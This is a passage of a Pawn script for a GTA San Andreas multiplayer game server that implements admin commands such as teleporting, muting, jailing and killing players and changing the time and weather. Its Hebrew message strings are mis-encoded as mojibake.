		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return ShowPlayerDialog(playerid,dialog_settime,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· ∙Єф","06 - ц°щчф\n08 - схў°\n14 - Ўф°щщэ\n20 - ∙ўщЄф\n23 - ьщьф\n00 - чЎх·","счщ°ф","щЎщрф");
		h = strval(cmd);
		if(h < 0 || h > 23) return SendClientMessage(playerid,red," .∙Єф ∙тхщф");
		SetWorldTime(h);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetPlayerTime(i,h,0);
		format(string,sizeof(string)," .∙щЁф р· ф∙Єф ь %d %s фрующя",h,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/setwea") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		SendClientMessage(playerid,grey," (юцт фрхщ° ю∙ЇщЄ Єь ЎсЄ ф∙ющщэ, юЎс фЄЁЁщэ хтхсф фтьщэ)");
		ShowPlayerDialog(playerid,dialog_setwea,DIALOG_STYLE_LIST,@c(lightblue) "счщ°· юцт рхщ°","°тщь\nщхэ сфщ°\nсфщ° щх·°\nсфщ° Єэ ЄЁЁщэ\nщхэ ё·щх\n°тщь Єэ ЄЁЁщэ\n∙ющщэ ётхьщэ\nт∙э, с°ўщэ х°Єющэ\nЄ°Їь\nьЇЁщ т∙э\nт∙э чцў щх·°\n∙ющщэ сфщ°щэ\nёхЇ· чхь\nЄЁЁщэ ∙чх°щэ","счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/goto") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(!CanUseCommand(playerid)) return 1;
		new id, Float:p[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /goto [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(GetPlayerState(id) == PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·т° рь ∙чўя сюЄўс");
		if(IsPlayerMAdmin(id) && playerinfo[id][blockgoto] && (playerinfo[id][admin] > playerinfo[playerid][admin]) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф чёэ ф∙·т°хщх· рьщх"), -1;
		if(!CanBeTeleported(playerid)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		GetPlayerFacingAngle(id,p[3]);
		GetXYInFrontOfPlayer(id,p[0],p[1],1.5);
		if(IsPlayerInAnyVehicle(playerid))
		{
			SetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]+2.0,playerid);
			SetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]+90.0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(id));
			LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(id));
		}
		else
		{
			SetPlayerPos(playerid,p[0],p[1],p[2]+1.5);
			SetPlayerFacingAngle(playerid,p[3]+90.0);
		}
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		if(playerid == id) SendClientMessage(playerid,yellow," .ф∙·т°· рь ЄЎюъ");
		else
		{
			format(string,sizeof(string)," .%s ф∙·т°· рь",GetName(id));
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(id,yellow," .фрующя ф∙·т° рьщъ");
		}
		return 1;
	}
	if((equal(cmd,"/get") || equal(cmd,"/gethere")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(!CanUseCommand(playerid)) return 1;
		new id, withv, Float:p[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /get [id/name] [with vehicle? yes/no] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) withv = playerinfo[playerid][getsetting][0];
		else
		{
			if(equal(cmd,"yes")) withv = 1;
			else if(equal(cmd,"no")) withv = 0;
			else SendClientMessage(playerid,red," .рЇ∙°х· Їўхуф ∙тхщф");
		}
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		switch(playerinfo[playerid][getsetting][3])
		{
			case 0, 1:
			{
				GetPlayerFacingAngle(playerid,p[3]);
				GetXYInFrontOfPlayer(playerid,p[0],p[1],!playerinfo[playerid][getsetting][3] ? 1.5 : (0-1.5));
			}
			case 2, 3: p[2] += playerinfo[playerid][getsetting][3] == 2 ? 2.5 : (0-2.5);
			case 4..6:
			{
				new Float:rad = 0.0;
				if(playerinfo[playerid][getsetting][3] == 2) rad = 10.0;
				else if(playerinfo[playerid][getsetting][3] == 3) rad = 25.0;
				else if(playerinfo[playerid][getsetting][3] == 4) rad = 50.0;
				p[0] += floatrand(0-rad,rad), p[1] += floatrand(0-rad,rad);
			}
		}
		if(withv)
		{
			if(!IsPlayerInAnyVehicle(id))
			{
				format(string,sizeof(string)," .ьр ЁюЎр с°ыс %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			SetVehiclePos(GetPlayerVehicleID(id),p[0],p[1],p[2]+2.0,id);
			SetVehicleZAngle(GetPlayerVehicleID(id),p[3]+90.0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(id),GetPlayerVirtualWorld(playerid));
			LinkVehicleToInterior(GetPlayerVehicleID(id),GetPlayerInterior(playerid));
		}
		else
		{
			SetPlayerPos(id,p[0],p[1],p[2]+1.5);
			SetPlayerFacingAngle(id,p[3]+90.0);
		}
		SetPlayerVirtualWorld(id,GetPlayerVirtualWorld(playerid));
		SetPlayerInterior(id,GetPlayerInterior(playerid));
		if(playerinfo[playerid][getsetting][1] != 0)
		{
			new Float:h, Float:a;
			switch(playerinfo[playerid][getsetting][1])
			{
				case 1: h = 100.0, a = 0.0;
				case 2: h = 100.0, a = 100.0;
				case 3: h = 50.0, a = 0.0;
				case 4: h = 1.0, a = 0.0;
			}
			SetPlayerHealth(id,h);
			SetPlayerArmour(id,a);
		}
		if(playerinfo[playerid][getsetting][2] != 0)
		{
			if(playerinfo[playerid][getsetting][2] == -1) ResetWeapons(id);
			else GiveWeapon(id,playerinfo[playerid][getsetting][2],10000);
		}
		if(playerinfo[playerid][getsetting][4]) SetFreeze(playerid,1,true);
		if(playerid == id) SendClientMessage(playerid,yellow," .∙щт°· р· ЄЎюъ рьщъ");
		else
		{
			format(string,sizeof(string)," .%s ∙щт°· рьщъ р·",GetName(id));
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(id,yellow," .фрующя ∙щт° рх·ъ рьщх");
		}
		return 1;
	}
	if((equal(cmd,"/dget") || equal(cmd,"/dgethere")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		//if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(!CanUseCommand(playerid)) return 1;
		new id, withv, Float:p[4], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dget [id/name] [with vehicle? yes/no] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) withv = 0;
		else
		{
			if(equal(cmd,"yes")) withv = 1;
			else if(equal(cmd,"no")) withv = 0;
			else SendClientMessage(playerid,red," .рЇ∙°х· Їўхуф ∙тхщф");
		}
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.5);
		if(withv)
		{
			if(!IsPlayerInAnyVehicle(id))
			{
				format(string,sizeof(string)," .ьр ЁюЎр с°ыс %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			SetVehiclePos(GetPlayerVehicleID(id),p[0],p[1],p[2]+2.0,id);
			SetVehicleZAngle(GetPlayerVehicleID(id),p[3]+90.0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(id),GetPlayerVirtualWorld(playerid));
			LinkVehicleToInterior(GetPlayerVehicleID(id),GetPlayerInterior(playerid));
		}
		else
		{
			SetPlayerPos(id,p[0],p[1],p[2]+1.5);
			SetPlayerFacingAngle(id,p[3]+90.0);
		}
		SetPlayerVirtualWorld(id,GetPlayerVirtualWorld(playerid));
		ResetWeapons(id);
		SetPlayerInterior(id,GetPlayerInterior(playerid));
		format(string,sizeof(string)," .хсЁхёє ючў· ьх р· фЁ∙ўщэ срхЇя рхшхюшщ %s ∙щт°· рьщъ р·",GetName(id));
		SendClientMessage(playerid,yellow,string);
		SendClientMessage(id,yellow," .фрующя ∙щт° рх·ъ рьщх хючў ьъ р· фЁ∙ўщэ срхЇя рхшхюшщ");
		return 1;
	}
	if(equal(cmd,"/getc") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getc [id/name] :Ўх°· ф∙щюх∙");
		new string[M_S];
		format(string,sizeof(string),"/get %s yes",cmd);
		command(playerid,string);
		return 1;
	}
	if(equal(cmd,"/gets") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		ShowPlayerConstDialog(playerid,dialog_getsetting);
		return 1;
	}
	if(equal(cmd,"/clean"))
	{
	 	for(new ii = 0; ii < 120; ii++) SendClientMessage(playerid,white," ");
		SendClientMessage(playerid,red,".Ёщўщ· ьЄЎюъ р· фЎ'рш");
		return 1;
	}
	if(equal(cmd,"/cc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(ccUsed) return SendClientMessage(playerid,red," .фЎ'рш ыс° Ёхўф ы°тЄ");
		new string[M_S], ccColors[] = {red,yellow,pink,purple,blue,white,black,brown,green,grey,darkblue,lightblue};
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && !IsPlayerMAdmin(i)) for(new ii = 0; ii < 120; ii++) SendClientMessage(i,white," ");
		format(string,sizeof(string)," .%s фЎ'рш Ёхўф Єь щущ фрующя",GetName(playerid));
		SendClientMessageToAll(ccColors[random(sizeof(ccColors))],string);
		ccUsed = 1;
		SetTimer("allowCCCommand",2000,0);
		return 1;
	}
	if(equal(cmd,"/cck") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], ccColors[] = {red,yellow,pink,purple,blue,white,black,brown,green,grey,darkblue,lightblue}, id = INVALID_PLAYER_ID;
		for(new i = 0, m = GetMaxPlayers(); i < m && id == INVALID_PLAYER_ID; i++) if(!IsPlayerConnected(i)) id = i;
		for(new i = 0; i < 5; i++) SendDeathMessage(id,id,1);
		format(string,sizeof(string)," .%s шсь· фф°щтх· Ёхў·ф Єь щущ фрующя",GetName(playerid));
		SendClientMessageToAll(ccColors[random(sizeof(ccColors))],string);
		return 1;
	}
	if(!strcmp(cmdtext,"/si",true) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(siUsed) return SendClientMessage(playerid,red," .фЇўхуф ыс° ∙хю∙ф с-10 ∙Ёщх· фрч°хЁх·. рЁр фю·я");
		new cchatColor, colorList[] = {red,yellow,pink,purple,blue,brown,green,darkblue,lightblue}, choosedColors[sizeof(colorList)], stringPos = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && !IsPlayerMAdmin(i)) for(new ii = 0; ii < 100; ii++) SendClientMessage(i,white," ");
		for(new i = 0; i < 6; i++)
		{
			cchatColor = random(sizeof(colorList));
			while(choosedColors[cchatColor]) cchatColor = random(sizeof(colorList));
			choosedColors[cchatColor] = 1;
			switch(stringPos++)
			{
				case 0: SendClientMessageToAll(colorList[cchatColor],"S");
				case 1: SendClientMessageToAll(colorList[cchatColor],"A");
				case 2: SendClientMessageToAll(colorList[cchatColor],"M");
				case 3: SendClientMessageToAll(colorList[cchatColor],"P");
				case 4: SendClientMessageToAll(colorList[cchatColor],"I");
				case 5: SendClientMessageToAll(colorList[cchatColor],"L");
			}
		}
		cchatColor = random(sizeof(colorList));
		while(choosedColors[cchatColor]) cchatColor = random(sizeof(colorList));
		choosedColors[cchatColor] = 1;
		SendClientMessageToAll(colorList[cchatColor],webpage " :фЎш°Їх ьЇх°хэ ∙ьЁх х·фЁх юфшсх· хЇ°ёщэ");
		GameTextForAll("~b~s~h~a~b~-~h~m~b~p~p~~h~.~y~co~p~~h~.~y~il",7000,1);
		siUsed = 1;
		SetTimer("allowSICommand",10000,0);
		return 1;
	}
	for(new i = 0; i < max_atoggles; i++) if(equal(cmd,AdminToggleType[i][atCommand]))
	{
		new string[M_S];
		if(playerinfo[playerid][admin] < AdminToggleType[i][atLevel] && !playerinfo[playerid][atoggle][i])
		{
			format(string,sizeof(string)," .Єьщъ ьфщх· ьЇчх· с°ю· рующя %d",AdminToggleType[i][atLevel]);
			return SendClientMessage(playerid,red,string);
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			format(string,sizeof(string)," %s [on/off] :Ўх°· ф∙щюх∙",AdminToggleType[i][atCommand]);
			return SendClientMessage(playerid,red,string);
		}
		if(equal(cmd,"on"))
		{
			playerinfo[playerid][atoggle][i] = true;
			format(string,sizeof(string)," .юЎс %s фхЇЄь",AdminToggleType[i][atHebName]);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"off"))
		{
			playerinfo[playerid][atoggle][i] = false;
			format(string,sizeof(string)," .юЎс %s фхЇёў",AdminToggleType[i][atHebName]);
			SendClientMessage(playerid,red,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		PlaySound(playerid,1057);
		format(string,sizeof(string),"AdminToggle%d",AdminToggleType[i][atUID]);
		fsetint(fuser(playerid),string,_:(playerinfo[playerid][atoggle][i]));
		return 1;
	}
	if(equal(cmd,"/togsay") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /togsay [say/asay/off] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"say"))
		{
			playerinfo[playerid][togsay] = 1;
			SendClientMessage(playerid,green," .фхЇЄь Say юЎс");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"asay"))
		{
			playerinfo[playerid][togsay] = 2;
			SendClientMessage(playerid,green," .фхЇЄь ASay юЎс");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][togsay]) return SendClientMessage(playerid,red," .ASay рх Say рщЁъ сюЎс");
			SendClientMessage(playerid,green,playerinfo[playerid][togsay] == 2? (" .фхЇёў ASay юЎс"):(" .фхЇёў Say юЎс"));
			playerinfo[playerid][togsay] = 0;
			PlaySound(playerid,1057);
		}
		else SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/wcheck") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, weaponid, pammo_, ws = 0, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /wcheck [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," ~~~ :%s фЁ∙ўщэ ∙ь ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		for(new i=0;i<13;i++)
		{
			GetPlayerWeaponData(id,i,weaponid,pammo_);
			if(pammo_ != 0)
			{
				format(string,sizeof(string),"%d. %s (Ammo: %d, Slot: %d)",++ws,WeaponName(weaponid),pammo_ == 65535 ? 00 : pammo_,i);
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(ws == 0)
		{
			format(string,sizeof(string)," .рщя Ё∙ўщэ %s ь",GetName(id));
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/getvid") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getvid [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerInAnyVehicle(id))
		{
			format(string,sizeof(string)," .ьр ЁюЎр с°ыс %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		format(string,sizeof(string)," фхр: %d %s фрщщущ ∙ь ф°ыс ∙ь",GetPlayerVehicleID(id),GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/vcount") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new vcount = 0, string[M_S];
		for(new i = 0; i < MAX_VEHICLES; i++) if(GetVehicleModel(i) > 0) vcount++;
		format(string,sizeof(string)," VCount = %d",vcount);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/sakill") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sakill [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerHealth(id,0.0);
		AdminInfo(playerid, cmdtext);
		return 1;
	}
	if(equal(cmd,"/akill") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /akill [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerHealth(id,0.0);
		format(string,sizeof(string)," *** %s has been killed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/m") || equal(cmd,"/mute")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, time, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /mute(m) [id/name] [time] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][mute][0] > 0)
		{
			format(string,sizeof(string)," .ыс° сф∙·ўф %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) time = 60;
		else time = strval(cmd);
		if(time < 1 || (((PlayerHasRank(playerid,RankID("рующЁщэ")) && time > GetAdminMaxTime(playerid)) || ((PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) && time > 100)))) return SendClientMessage(playerid,red," .цюя ∙тхщ");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		playerinfo[id][mute][0] = time;
		SetTimerPck(playerinfo[id][mute][1],"UnMute",1000,1,"d",id);
		if(playerinfo[id][logged]) fsetint(fuser(id),"MuteTime",playerinfo[id][mute][0]);
		format(string,sizeof(string)," *** %s has been muted for %d seconds by %s. (%s)",GetName(id),time,GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unm") || equal(cmd,"/unmute")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unmute(unm) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(playerinfo[id][mute][0] <= 0)
		{
			format(string,sizeof(string)," .ьр сф∙·ўф %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][mute][0] = 0;
		KillTimer(playerinfo[id][mute][1]);
		if(playerinfo[id][logged]) fsetint(fuser(id),"MuteTime",playerinfo[id][mute][0]);
		format(string,sizeof(string)," *** %s has been unmuted by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/j") || equal(cmd,"/jail")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, time, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /jail(j) [id/name] [time] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][jail][0] > 0)
		{
			format(string,sizeof(string)," .ыс° сыьр %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		cmd = strtok(cmdtext,idx), time = !strlen(cmd) ? 60 : strval(cmd);
		if(time < 1 || (((PlayerHasRank(playerid,RankID("рующЁщэ")) && time > GetAdminMaxTime(playerid)) || ((PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) && time > 100)))) return SendClientMessage(playerid,red," .цюя ∙тхщ");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		JailPlayer(id,time);
		format(string,sizeof(string)," *** %s has been jailed for %d seconds by %s. (%s)",GetName(id),time,GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/unj") || equal(cmd,"/unjail")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unjail(unj) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(playerinfo[id][jail][0] <= 0)
		{
			format(string,sizeof(string)," .ьр сыьр %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		playerinfo[id][jail][0] = 0;
		KillTimer(playerinfo[id][jail][1]);
		SetPlayerInterior(id,0);
		SetFreeze(id,0,false);
		SpawnPlayer(id);
		if(playerinfo[id][logged]) fsetint(fuser(id),"JailTime",playerinfo[id][jail][0]);
		format(string,sizeof(string)," *** %s has been unjailed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/xj") || equal(cmd,"/xjail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S], reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /xjail(xj) [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][xjail])
		{
			format(string,sizeof(string)," .ыс° сыьр ·ющущ %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		reason = strrest(cmdtext,idx);
